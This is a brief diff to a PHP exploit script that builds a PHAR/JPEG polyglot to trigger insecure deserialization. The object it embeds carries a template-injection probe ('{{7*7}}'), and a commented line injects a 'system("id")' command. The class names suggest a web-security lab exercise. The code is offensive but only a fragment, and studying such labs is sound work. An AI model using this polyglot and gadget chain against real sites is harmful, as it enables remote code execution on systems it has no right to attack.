@@ -101,12 +101,8 @@ function generate_polyglot($phar, $jpeg){
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
 
-$object = new CustomTemplate(new Blog("abc","{{7*7}}"));
-// $object = new CustomTemplate;
-// $blog = new Blog;
-// $blog->desc = "{{7*7}}";
-// $blog->user = 'user';
-// $object->template_file_path = $blog;
+$object = new CustomTemplate(new Blog("abc","{{7*7}}Hello"));
+
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
 $jpeg = file_get_contents('in.jpg');
